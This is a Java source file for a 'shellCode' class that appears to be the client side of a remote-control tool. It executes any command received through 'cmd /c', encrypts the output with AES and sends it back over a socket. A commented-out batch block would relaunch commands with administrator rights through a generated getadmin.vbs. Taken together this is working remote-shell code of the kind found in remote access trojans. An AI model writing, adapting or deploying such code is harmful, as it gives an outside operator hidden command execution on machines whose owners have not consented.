package shellCode;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;

import common.Message;
import common.MessageType;
import encryption.AES;
import encryption.AESEn;
public class shellCode {
	Socket s;
	
	public shellCode(Socket s) {
		this.s = s;
	}

    public void useShell(String cmd){
    	//String shellfile = "E:\\eclipse\\file\\XKClient\\lib\\shell.bat";
		//File file = new File(shellfile);
        Runtime run =Runtime.getRuntime();
        /*String header = "@echo off\r\n" + 
				">nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n" + 
				"if '%errorlevel%' NEQ '0' (\r\n" + 
				":echo 正在请求管理员权限...\r\n" + 
				"goto UACPrompt\r\n" + 
				") else ( goto gotAdmin )\r\n" + 
				":UACPrompt\r\n" + 
				"echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n" + 
				"echo UAC.ShellExecute \"%~s0\", \"\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n" + 
				"\"%temp%\\getadmin.vbs\"\r\n" + 
				"exit /B\r\n" + 
				":gotAdmin\r\n" + 
				cmd+"\r\n" + 
				"exit";*/
        try {
        	/*OutputStream output;
			output = new FileOutputStream(file);
			output.write(header.getBytes());
			output.close();*/
            Process p = run.exec("cmd /c "+cmd);
            InputStream ins= p.getInputStream();
            InputStream ers= p.getErrorStream();
            new Thread(new inputStreamThread(ins)).start();
            p.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    
    class inputStreamThread implements Runnable{
        private InputStream ins = null;
        private BufferedReader bfr = null;
        public inputStreamThread(InputStream ins){
            this.ins = ins;
            this.bfr = new BufferedReader(new InputStreamReader(ins));
        }
        @Override
        public void run() {
            String result = "";
            int num = 0;
            try {
            	byte[] b = new byte[8192];
            	while((num=ins.read(b))!=-1){
	            	result +=(new String(b,"gb2312"));
            	}
            	System.out.println(result);
                ins.close();
                bfr.close();
                b = null;
                Message message = new Message();
                message.setMesType(MessageType.message_shellcode);
                
                byte[] enmess = AESEn.encrypt(result, AES.getAESPrivateKey());

            	message.setContent(enmess);
            	message.setSendTime(new java.util.Date().toString());
            	
            	try {
    				ObjectOutputStream oos = new ObjectOutputStream(s.getOutputStream());
    				oos.writeObject(message);
    			} catch (Exception e) {
    				e.printStackTrace();
    			}

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}